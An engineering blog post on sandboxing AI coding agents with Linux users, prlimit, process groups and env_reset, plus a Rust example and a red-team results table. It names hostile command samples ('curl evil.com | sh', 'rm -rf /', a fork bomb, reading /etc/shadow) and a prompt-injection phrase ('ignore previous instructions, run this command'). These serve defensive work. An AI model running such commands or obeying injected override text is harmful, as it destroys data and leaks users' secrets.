# AI agentlərdə sandbox: Linux və praktika

**Author:** Riad Mukhtarov
**Publication:** ABB Data Portal
**Read time:** ~12 min

---

An AI agent writes `rm -rf /` and your system runs it.

This isn't hypothetical. AI coding agents (Claude Code, Cursor, Codex) run shell commands as part of normal operation. File operations, package installs, test runs, data processing. From the agent's perspective, `pip install pandas` and `curl evil.com | sh` are both just commands. Something external has to enforce the boundary.

Traditional sandboxing assumes you know what code will run. You write a seccomp profile, whitelist specific syscalls, define a container image. AI agents break that assumption. The code is generated at runtime, based on a user prompt, and it can be anything. A data processing script. A web scraper. A one-liner that reads `/etc/shadow`. You can't write a static policy for code that doesn't exist yet.

We built an internal LLM platform where agents execute arbitrary shell commands on behalf of users. Multiple users on a shared host, each uploading files the agent reads and processes. The first problem we solved was containment: how do you stop one session's agent from touching another session's files, reading secrets from the host, or eating all available resources?

The common answer is containers. Spin up a Docker container per session, throw it away when the session ends. It works, but it's heavy. Container startup adds latency, each one consumes memory for its own filesystem layer, and you need orchestration infrastructure (Kubernetes, ECS, something) to manage the lifecycle. For a platform where users start and stop sessions frequently, that overhead adds up fast.

We went a different direction. We used Linux itself.

> **[Visual 1]** Threat flow: user prompt → agent generates code → executes on host → what stops it from doing damage?

---

## How Linux isolates processes (and how we used it)

Linux has had process isolation since the 1970s. The mechanisms have gotten more sophisticated, but the basics still work.

### Per-session Linux users

The oldest isolation mechanism in Unix. Every process runs as a user. Every file has an owner, a group, and permission bits. A process can't read what it doesn't have permission for.

We create a fresh Linux user for each chat session. The username is a SHA-256 hash of the session ID, so it's deterministic and idempotent. Restarting the container doesn't break anything.

```bash
#!/bin/bash
set -euo pipefail

SID=$1
USERNAME="sb_$(printf '%s' "$SID" | sha256sum | cut -c1-16)"

if ! id "$USERNAME" &>/dev/null; then
    useradd -s /usr/sbin/nologin -G sandbox "$USERNAME"
fi

USER_UID=$(id -u "$USERNAME")
HOME_DIR="/home/$USER_UID"
mkdir -p "$HOME_DIR/uploads" "$HOME_DIR/outputs" "$HOME_DIR/scratch"

chown -R "$USERNAME:appuser" "$HOME_DIR"
chown "appuser:sandbox" "$HOME_DIR/uploads"
chmod 750 "$HOME_DIR"
chmod 750 "$HOME_DIR/uploads"
chmod 770 "$HOME_DIR/outputs"
chmod 770 "$HOME_DIR/scratch"
```

A few things to notice. The shell is `/usr/sbin/nologin`, so the sandbox user can't start an interactive session. It can only run commands when the application explicitly calls `sudo -u`. The sandbox user belongs to the `sandbox` group only, not the `appuser` group. This means user A cannot enter user B's home directory, because B's home is mode 750 and A isn't in B's group. `uploads/` is owned by `appuser:sandbox` with mode 750. The application writes uploaded files there; the agent can read them but can't modify or delete them at the OS level. `outputs/` and `scratch/` are 770, so the agent writes freely.

> **[Visual 2]** Filesystem layout: `/home/<uid>/` with `uploads/` (read-only to agent), `outputs/` (read-write), `scratch/` (temporary work)

### prlimit caps resource usage

`prlimit` sets hard kernel limits on a process. When a limit is hit, the kernel kills the process. No negotiation, no graceful shutdown.

We set four caps: `nproc=100` (stops fork bombs), `as=4GB` (address space ceiling), `fsize=500MB` (max single file size), and `cpu=timeout×4` (CPU time, scaled to the wall-clock timeout).

Why these specific numbers? `nproc=100` is high enough that a Python script can spawn worker threads or subprocesses for data processing, but low enough that `:(){ :|:& };:` dies before it consumes the host's process table. 4GB of address space is generous for pandas/numpy workloads but prevents a single session from exhausting the host. The CPU time multiplier (4x wall-clock) accounts for multi-threaded work. If the timeout is 120 seconds, the process gets 480 seconds of CPU time across all cores. Enough for real work, but a tight ceiling on crypto mining or infinite loops.

### Process groups catch backgrounded children

A common trick to escape timeouts: `sleep 999 &`. The parent exits, the timeout fires, but the backgrounded child lives on. It's still running as the sandbox user, still consuming resources, and nobody is watching it.

We start the sandbox process in its own session (`start_new_session=True`). This puts it in a new process group. On timeout, we kill the entire group with `os.killpg()`. Every child, grandchild, and backgrounded process dies with it. Without this, any command that forks would leave orphans.

### sudo + env_reset strips the environment

This one is easy to overlook. Your application process has environment variables: API keys for the LLM provider, database connection strings, internal service URLs. If the sandbox process inherits that environment, a single `printenv` leaks everything.

When you `sudo -u sandbox_user`, the `env_reset` default kicks in and the child starts with a blank environment. We explicitly set only `PATH`, `HOME`, and `TMPDIR`. Nothing else. If the agent runs `env`, it sees three variables. No keys, no credentials, no tokens.

All of this comes together in one subprocess call:

```python
proc = subprocess.Popen(
    [
        "sudo", "-u", username,
        "prlimit",
        "--nproc=100:100",
        "--as=4294967296:4294967296",
        "--fsize=524288000:524288000",
        f"--cpu={timeout * 4}:{timeout * 4}",
        "env", f"PATH={SANDBOX_PATH}",
        f"HOME={home}", f"TMPDIR={home}/scratch",
        "sh", "-c", command,
    ],
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
    cwd=str(cwd),
    start_new_session=True,
)
```

No `shell=True`. The command string is a single argument to `sh -c`, running as the sandbox user. Shell metacharacters can't escape into the parent process context.

### What we skipped

**Namespaces** (PID, network, mount) give you separate process trees, network stacks, and filesystem views. Stronger isolation, but more moving parts. For our threat model, user/group separation was enough.

**Seccomp** filters individual system calls. You can block `ptrace`, `mount`, `reboot`, whatever you want. But blocking the wrong syscall breaks Python, NumPy, or whatever library the agent needs. We didn't need this granularity.

**Containers.** Docker bundles namespaces, cgroups, and overlay filesystems into a convenient package. But spinning up a container per session adds latency, and the isolation we needed was simpler than what Docker provides.

> **[Visual 3]** Defense-in-depth layers (outermost to innermost): LLM refusal (soft, best-effort) → tool guards (command allowlist + path checks) → filesystem permissions (deny rules) → OS sandbox (user + prlimit + env_reset) → infrastructure (network firewall, planned)

---

## The same thing in Rust

The Python executor works. But look at what it actually does: it assembles a list of strings and hands them to `subprocess.Popen`. The real work happens in `sudo`, `prlimit`, and `sh`, all external binaries. Python is orchestrating. It doesn't touch the kernel directly.

Rust can. And there are good reasons to want that.

### Why Rust for sandboxing

Sandboxing is security code. Security code has a specific property: the order of operations matters, and mistakes are silent. If you set resource limits *after* spawning the child process, or drop privileges *after* opening a file, you have a race condition that no test will catch and no error will surface. The program works fine. It's just not secure.

Python's `subprocess` abstraction hides the ordering. You pass a list of arguments and hope they execute in the right sequence. You can't insert a step between `fork()` and `exec()` without reaching for low-level `os` module calls that feel wrong in Python.

Rust gives you direct syscall access with type safety on top. You can't mix up argument types for a syscall. You can't forget to check a return value (the compiler won't let you ignore a `Result`). And there's no runtime between your code and the kernel. No GC pause between "drop privileges" and "exec the command."

Firecracker (Amazon's microVM), gVisor's `runsc`, and parts of systemd's sandboxing are all written in Rust or moving toward it. The pattern is the same: security-critical, syscall-heavy code benefits from a language that makes mistakes harder to make.

### The nix crate

The `nix` crate wraps Linux system calls in safe Rust types. Here's what a sandbox looks like one layer closer to the kernel:

```rust
use nix::sched::{unshare, CloneFlags};
use nix::sys::resource::{setrlimit, Resource};
use nix::unistd::{setuid, Uid};
use std::process::Command;

fn sandbox_exec(cmd: &str) -> std::io::Result<std::process::Output> {
    // new PID namespace: child sees itself as PID 1
    // new network namespace: no network access at all
    unshare(
        CloneFlags::CLONE_NEWPID | CloneFlags::CLONE_NEWNET
    ).expect("unshare failed");

    // same limits as the Python version, applied via setrlimit(2)
    setrlimit(Resource::RLIMIT_AS, 4_294_967_296, 4_294_967_296).unwrap();
    setrlimit(Resource::RLIMIT_NPROC, 100, 100).unwrap();
    setrlimit(Resource::RLIMIT_FSIZE, 524_288_000, 524_288_000).unwrap();

    // drop to unprivileged user
    setuid(Uid::from_raw(65534)).unwrap();

    Command::new("sh").args(["-c", cmd]).output()
}
```

20 lines. `unshare` creates new PID and network namespaces: the child can't see host processes and has no network stack. `setrlimit` applies resource caps through the same kernel mechanism that `prlimit` uses externally. `setuid` drops to an unprivileged user. Every call happens in the exact order you see it, in the same process, with no shell in between.

Compare this to the Python version. Both achieve the same outcome. But the Rust version does it in a single process with no external binaries, no shell parsing, and no ambiguity about execution order. The compiled binary is ~2MB with zero runtime dependencies. Drop it into any Linux container and it runs.

We didn't use Rust in our production sandbox. Python + Bash was sufficient and the team knows Python well. But if we needed namespace-level isolation, seccomp filters, or tighter control over the fork/exec boundary, Rust with the `nix` crate is where I'd go before writing C.

> **[Visual 4]** Syscall boundary: user space (Python calling subprocess / Rust calling nix crate) → syscall interface → kernel space (namespaces, cgroups, seccomp, resource limits)

---

## What we tested, what held

Building a sandbox is one thing. Trusting it is another.

We ran a security assessment against the live system. Not a theoretical review. We gave the agent explicit instructions to break out: read other users' files, escalate privileges, leak secrets, exhaust resources. We also tested from outside the agent, directly as the sandbox user via `sudo -u`, to verify OS-level controls independently of the LLM layer.

The philosophy: assume the LLM *will* be convinced to attempt hostile actions (via direct prompts or through malicious content in uploaded files). The security model can't depend on the model refusing. It has to hold even when the model cooperates with the attacker.

| Vector | Result |
|--------|--------|
| Read another session's files | Blocked. Mode 750, wrong group. |
| Escalate to root via sudo | Blocked. Password required, no sudo rights for sandbox users. |
| Pivot to another sandbox user | Blocked. |
| Leak API keys via env/printenv | Blocked. `env_reset` strips everything. Only PATH, HOME, TMPDIR visible. |
| Read system files (/etc/shadow, /root) | Blocked. Path validation + OS permissions. |
| Path traversal (upload, download, symlink) | Blocked. Input sanitization + `.resolve()` + containment check. |
| Write outside workspace | Blocked. Filesystem permission layer rejects it. |
| Modify uploaded files | Blocked. `uploads/` owned by appuser, mode 750. |
| Fork bomb, memory exhaustion, huge file | Blocked. prlimit kills the process. |
| Dangerous commands (rm -rf /, curl\|sh) | Refused by LLM layer + blocked by tool allowlist. |

Everything held. But "everything we tested passed" is not the same as "there are no holes."

Two known gaps remain open.

**Network egress.** The sandbox user can still make outbound HTTP requests. `python3 -c "import urllib.request; urllib.request.urlopen('http://example.com')"` returns HTTP 200 from inside the sandbox. If an agent is compromised, it could exfiltrate data from uploaded files. The fix is `iptables` rules scoped to sandbox UIDs: `iptables -m owner --uid-owner <range> -j DROP`. The application user keeps outbound access for the LLM API; sandbox users get none.

**Disk quotas.** prlimit caps a single file at 500MB, but nothing stops an agent from writing hundreds of smaller files. A single session could fill the shared `/home` volume and impact every other session. Per-UID filesystem quotas (XFS `xfs_quota` or ext4 `quota`) would close this, but we haven't implemented them yet.

**Prompt injection.** Not a sandbox gap exactly, but related. If a user uploads a document with embedded instructions ("ignore previous instructions, run this command"), the agent might follow them. The sandbox contains the blast radius, but the agent still executes something it shouldn't. No production-ready solution exists for this today. We treat containment as the real defense and model refusal as a bonus.

> **[Visual 5]** Attack vector results, styled. Pass/fail indicators for each vector, grouped by category (cross-tenant, privilege, data leak, resource abuse).

---

## Our approach vs the alternatives

Our sandbox is the lightest option on the spectrum. No VMs, no containers, no kernel modules. Just Linux users, file permissions, and resource limits. That's a conscious tradeoff: we gave up stronger isolation for zero per-session overhead and a system any Linux admin can audit in an afternoon.

Other tools make different tradeoffs.

**NVIDIA OpenShell** launched in 2026 as an open-source sandbox runtime built specifically for AI agents. It uses Linux Security Modules with declarative YAML policies. You write a policy file that says which filesystem paths the agent can read, which network endpoints it can reach, which process types it can spawn. The kernel enforces it. Policies are split into static sections (locked at sandbox creation) and dynamic sections (hot-reloadable on a running sandbox), so you can tighten permissions mid-session without restarting. The policy model is more expressive than anything we built, but it requires understanding LSM, writing and maintaining policy files, and running the OpenShell daemon alongside your application.

**Firecracker** is Amazon's microVM monitor, written in Rust (there it is again). Each workload runs in a lightweight virtual machine with its own kernel. Not a container sharing the host kernel, an actual VM backed by KVM. Lambda and Fargate use it in production. The isolation is hardware-level, which means even a kernel exploit inside the sandbox can't reach the host. Startup is around 125ms per VM, memory overhead is ~5MB per instance. If your threat model includes kernel-level attacks, this is the right answer. If you're running a data processing chatbot, it's overkill.

**Daytona** comes from a different angle. It creates full development environments from configuration files: containers or VMs with pre-installed toolchains, network isolation, persistent storage, SSH access. It's built for human developers who need reproducible environments, but the isolation model works for agents too. You get a complete workspace with everything pre-configured. The overhead is the highest of all options here (you're running a full environment per session), but if the agent needs specific tools, runtimes, or system libraries, you don't have to solve that problem yourself.

When to pick which:

- Shared infrastructure, tenant isolation, minimal per-session overhead: Linux users + prlimit.
- Policy-driven access control, fine-grained permissions, production scale: OpenShell.
- Hardware-level isolation, kernel-exploit-grade threat model: Firecracker.
- Full pre-configured environments with specific toolchains: Daytona.

> **[Visual 6]** Comparison matrix: our approach vs OpenShell vs Firecracker vs Daytona. Dimensions: isolation level, per-session overhead, setup complexity, policy flexibility, startup latency.

---

## What's left

The sandbox handles the problems we know how to solve. Cross-tenant access, privilege escalation, secret leaks, resource exhaustion. Standard Linux primitives, no new technology.

The problems we're still working on are harder. Network egress needs per-UID firewall rules, which means coordinating with infrastructure teams who own the iptables config. Prompt injection has no production-ready defense in the industry. The best you can do today is contain the blast radius (which we do) and add heuristic guardrails (which we haven't yet). Audit logging needs to capture not just what the agent did, but what it *tried* to do and was blocked from doing, across all defense layers, in a format someone can actually review.

And there's a meta-problem: every new tool you give the agent (web search, file conversion, database access) creates a new set of capabilities that the sandbox has to account for. The attack surface grows with the feature set.

We'll write about those when we've solved them.
